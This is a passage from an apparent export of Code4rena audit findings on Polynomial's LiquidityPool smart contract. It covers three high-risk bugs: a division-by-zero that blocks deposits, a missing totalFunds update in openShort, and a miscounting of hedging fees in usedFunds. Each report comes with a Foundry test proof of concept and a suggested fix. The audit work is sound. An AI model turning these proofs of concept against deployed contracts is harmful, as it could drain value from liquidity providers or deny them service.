partial withdrawals, causing totalFunds to be non-zero after a complete withdrawal, due to rounding from the withdrawals.      function getTokenPrice() public view override returns (uint256) {         if (totalFunds == 0) {             return 1e18;         }          uint256 totalSupply = liquidityToken.totalSupply() + totalQueuedWithdrawals;         int256 skew = _getSkew();          if (skew == 0) {             return totalFunds.divWadDown(totalSupply);         }          (uint256 markPrice, bool isInvalid) = getMarkPrice();         require(!isInvalid);          uint256 totalValue = totalFunds;          uint256 amountOwed = markPrice.mulWadDown(powerPerp.totalSupply());         uint256 amountToCollect = markPrice.mulWadDown(shortToken.totalShorts());         uint256 totalMargin = _getTotalMargin();          totalValue += totalMargin + amountToCollect;         totalValue -= uint256((int256(amountOwed) + usedFunds));          return totalValue.divWadDown(totalSupply);     }   ## Proof of Concept   Add the following test case to `test/LiquidityPool.Trades.t.sol`      function testLiquidityPoolTokenPriceError() public {         uint256 longAmount = 100e18;         int256 skew = pool.getSkew();         assertEq(skew, 0);          // make some trades for pool to earn fees         susd.mint(user_1, 100e18);         openLong(longAmount, longAmount * 1000, user_1);         setAssetPrice(initialPrice * 99 / 100);         closeLong(longAmount, 0, user_1);          // Queue withdrawal. This was deposited in TestSystem.preparePool()         pool.queueWithdraw(1_000_000e18, address(this));         skip(14500);          // This will perform a partial withdrawals due to margin in perpMarket         // we use this just to trigger some rounding so that          // totalFunds wont be zero during we fully withdraw from the pool         pool.processWithdraws(1);          // Transfer back margins from perpMarket so that         // we can continue to withdraw the balance.         pool.rebalanceMargin(-70567200000000000000000);          // This will do a complete withdrawals, reducing totalSupply to zero.         // However, getTokenPrice() will encounter division by zero error.         // That is because there will be small amount of totalFund left due to rounding.         pool.processWithdraws(1);          // approve funds for deposit again         susd.approve(address(pool), 1_000_000e18);          // This deposit will revert as LiquidityPool.getTokenPrice()          // will encounter division by zero error.         vm.expectRevert();         pool.deposit(1_000_000e18, address(this));      }   ## Recommended Mitigation Steps Add in validation to check and handle when totalSupply is zero."}, {"title": "Missing totalFunds update in LiquidityPool's OpenShort(), causing LiquidityPool token holder to lose a portion of their token value", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/153", "labels": ["bug", "3 (High Risk)", "judge review requested", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-07"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L494-L521   # Vulnerability details  The function `openShort()` in `LiquidityPool.sol` is missing an update to `totalFunds`, to increase `LiquidityPool` funds by the collected net fees.  ## Impact As a result of the missing increment to `totalFunds`, the `availableFunds` in the `LiquidityPool` will be lower. This will impact the token price, causing a lower token price on `openShort()` trades. This will result in `LiquidityPool` token holders to lose part of their token value.    ### Detailed Explanation  The function `openShort()` is supposed to increase the `totalFunds` by `(feesCollected - externalFee)` as the trading fees is paid by the trader, via a deduction of the `tradeCost`.             totalCost = tradeCost - fees;          SUSD.safeTransfer(user, totalCost);  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L506-L508    ## Proof of Concept  Add the following imports and test case to `test/LiquidityPool.Trades.t.sol`      import {wadMul} from \"solmate/utils/SignedWadMath.sol\";     import {IPerpsV2Market} from \"../src/interfaces/synthetix/IPerpsV2Market.sol\";        function testLiquidityPoolOpenShort() public {         uint256 amount = 1e18;             (uint256 markPrice, bool isInvalid) = pool.getMarkPrice();         uint256 tradeCost = amount.mulWadDown(markPrice);         uint256 fees = pool.orderFee(int256(amount));          uint256 delta = pool.getDelta();         int256 hedgingSize = wadMul(int256(amount), int256(delta));         IPerpsV2Market perp = pool.perpMarket();         (uint256 hedgingFees, ) = perp.orderFee(hedgingSize, IPerpsV2MarketBaseTypes.OrderType.Delayed);         uint256 feesCollected = fees - hedgingFees;         uint256 externalFee = feesCollected.mulWadDown(pool.devFee());          uint256 totalFundsBefore = pool.totalFunds();         int256 usedFundsBefore = pool.usedFunds();          // Open a Short trade         openShort(amount, amount * 1000, user_1);          // Calculated expected totalFunds and usedFunds         uint256 expectedTotalFunds = totalFundsBefore + feesCollected - externalFee;         uint256 marginRequired = tradeCost + hedgingFees;         int256 expectedUsedFunds = usedFundsBefore + int256(tradeCost) - int256(hedgingFees) + int256(marginRequired);          // This is incorrect as LiquidityPool's totalFunds is supposed to increase by net fee (feesCollected - externalFee)         assertLt(pool.totalFunds(), expectedTotalFunds);          // LiquidityPool's UsedFunds is also wrong and is higher than expected as it included hedgingFees.         assertGt(pool.usedFunds(), expectedUsedFunds);          uint256 poolAvailableFunds = pool.totalFunds() - uint256(pool.usedFunds());         uint256 expectedAvailableFunds = expectedTotalFunds - uint256(expectedUsedFunds);                // LiquidityPool's available funds is wrong and is less than expected, as totalFunds is not increased correctly         assertLt(poolAvailableFunds, expectedAvailableFunds);         assertEq(poolAvailableFunds, expectedAvailableFunds - hedgingFees);           // LiquidityPool's available funds is wrong and is also less than SUSD balance          assertLt(poolAvailableFunds, susd.balanceOf(address(pool)));          // LiquidityPool's available fund is expected to be the same as Pool's SUSD balance         assertEq(expectedAvailableFunds, susd.balanceOf(address(pool)));          // LiquidityPool Token price is less than expected.         assertLt(pool.getTokenPrice(), getExpectedTokenPrice(expectedTotalFunds, expectedUsedFunds, perp));      }      function getExpectedTokenPrice(uint256 expectedTotalFunds, int256 expectedUsedFunds, IPerpsV2Market perp) public returns (uint256 expectedTokenPrice) {         (uint256 markPrice,) = pool.getMarkPrice();         uint256 totalValue = expectedTotalFunds;         uint256 totalSupply = lqToken.totalSupply() + pool.totalQueuedWithdrawals();         uint256 amountOwed = markPrice.mulWadDown(powerPerp.totalSupply());         uint256 amountToCollect = markPrice.mulWadDown(shortToken.totalShorts());         //uint256 totalMargin = _getTotalMargin();          (uint256 totalMargin,) = perp.remainingMargin(address(pool));          totalValue += totalMargin + amountToCollect;         totalValue -= uint256((int256(amountOwed) + expectedUsedFunds));          expectedTokenPrice = totalValue.divWadDown(totalSupply);     }     ## Recommended Mitigation Steps  Add the following to update `totalFunds` with the net fee collection.          totalFunds += feesCollected - externalFee;  "}, {"title": "Incorrect calculation of usedFunds in LiquidityPool leads to lower than expected token price", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/152", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-08"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L452 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L484 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L516 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L549   # Vulnerability details   In `LiquidityPool.sol`, the functions `openLong()`, `closeLong()`, `openShort()` and `closeShort()` do not deduct `hedgingFees` from `usedFunds` to offset the `hedgingFees` that was added due to `_hedge()`.  ## Impact  The missing deduction of `hedgingFees` will increase the `usedFunds` in `LiquidityPool`, thus reducing the `availableFunds`. This leads to a lower token price, causing `LiquidityPool` token holders to be shortchanged, losing a portion of their token value.   ### Detailed Explanation  Passive users can provide liquidity to the Liquidity Pool to earn exchange fees, while traders can take long or short position against the Exchange.   The trade functions `openLong()`, `closeLong()`, `openShort()` and `closeShort()` in `LiquidityPool.sol` will call `_hedge` to hedge the liquidity pool's exposure during a trade.    The `hedge()` will actually increase `usedFunds` by the margin required, which includes `hedgingFees` as these are transfered over to the `perpMarket` for the hedging.          uint256 marginRequired = _calculateMargin(hedgingSize) + hedgingFees;         usedFunds += int256(marginRequired);         require(usedFunds <= 0 || totalFunds >= uint256(usedFunds));          perpMarket.transferMargin(int256(marginRequired));    https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L807-L811   Using the `OpenLong()` trade as an example, the trader transfers the `tradeCost + fees` to `LiquidityPool`, which includes the premium, `hedgingFees`,  `feesCollected` and `externalFee`.  That means the `hedgingFees` that was transfered in `_hedge()` is actually provided by the trader and not the `LiquidityPool`.   Hence, the usedFunds should be reduced by `hedgingFees` to offset the addition in `_hedge()`.          uint256 fees = orderFee(int256(amount));         totalCost = tradeCost + fees;          SUSD.safeTransferFrom(user, address(this), totalCost);          uint256 hedgingFees = _hedge(int256(amount), false);         uint256 feesCollected = fees - hedgingFees;         uint256 externalFee = feesCollected.mulWadDown(devFee);          SUSD.safeTransfer(feeReceipient, externalFee);          usedFunds -= int256(tradeCost);         totalFunds += feesCollected - externalFee;          https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L441-L453     ## Proof of Concept  Then add the following imports and test case to `test/LiquidityPool.Trades.t.sol`      import {wadMul} from \"solmate/utils/SignedWadMath.sol\";     import {IPerpsV2Market} from \"../src/interfaces/synthetix/IPerpsV2Market.sol\";        function testLiquidityPoolFundCalculation() public {         uint256 longAmount = 1e18;             (uint256 markPrice, bool isInvalid) = pool.getMarkPrice();         uint256 tradeCost = longAmount.mulWadDown(markPrice);         uint256 fees = pool.orderFee(int256(longAmount));          uint256 delta = pool.getDelta();         int256 hedgingSize = wadMul(int256(longAmount), int256(delta));         IPerpsV2Market perp = pool.perpMarket();         (uint256 hedgingFees, ) = perp.orderFee(hedgingSize, IPerpsV2MarketBaseTypes.OrderType.Delayed);         uint256 feesCollected = fees - hedgingFees;         uint256 externalFee = feesCollected.mulWadDown(pool.devFee());          uint256 totalFundsBefore = pool.totalFunds();         int256 usedFundsBefore = pool.usedFunds();          // Open a Long trade         openLong(longAmount, longAmount * 1000, user_1);          // Calculated expected totalFunds and usedFunds         uint256 expectedTotalFunds = totalFundsBefore + feesCollected - externalFee;         uint256 marginRequired = tradeCost + hedgingFees;         int256 expectedUsedFunds = usedFundsBefore - int256(tradeCost) - int256(hedgingFees) + int256(marginRequired);          // This is correct as the pool will increase by net fee (feesCollected - externalFee)         assertEq(pool.totalFunds(), expectedTotalFunds);          // LiquidityPool's UsedFunds is wrong and is higher than expected as it included hedgingFees.         assertGt(pool.usedFunds(), expectedUsedFunds);          uint256 poolAvailableFunds = pool.totalFunds() - uint256(pool.usedFunds());         uint256 expectedAvailableFunds = expectedTotalFunds - uint256(expectedUsedFunds);                  // LiquidityPool's available funds is wrong and is less than expected as it factored in hedgingFees         assertLt(poolAvailableFunds, expectedAvailableFunds);         assertEq(poolAvailableFunds, expectedAvailableFunds - hedgingFees);          // LiquidityPool's available funds is wrong and is also less than SUSD balance          assertLt(poolAvailableFunds, susd.balanceOf(address(pool)));          // LiquidityPool's available fund is expected to be the same as Pool's SUSD balance         assertEq(expectedAvailableFunds, susd.balanceOf(address(pool)));          // LiquidityPool Token price is less than expected.         assertLt(pool.getTokenPrice(), getExpectedTokenPrice(expectedTotalFunds, expectedUsedFunds, perp));              }      function getExpectedTokenPrice(uint256 expectedTotalFunds, int256 expectedUsedFunds, IPerpsV2Market perp) public returns (uint256 expectedTokenPrice) {         (uint256 markPrice,) = pool.getMarkPrice();         uint256 totalValue = expectedTotalFunds;         uint256 totalSupply = lqToken.totalSupply() + pool.totalQueuedWithdrawals();         uint256 amountOwed = markPrice.mulWadDown(powerPerp.totalSupply());         uint256 amountToCollect = markPrice.mulWadDown(shortToken.totalShorts());         //uint256 totalMargin = _getTotalMargin();          (uint256 totalMargin,) = perp.remainingMargin(address(pool));          totalValue += totalMargin + amountToCollect;         totalValue -= uint256((int256(amountOwed) + expectedUsedFunds));          expectedTokenPrice = totalValue.divWadDown(totalSupply);     }     ## Recommended Mitigation Steps  Deduct `hedgingFees` from `usedFunds` to offset the `hedgingFees` added in `_hedge()`.  For example, in openLong change          usedFunds -= int256(tradeCost);  to            usedFunds -= int256(tradeCost) - int256(hedgingFees);  "}]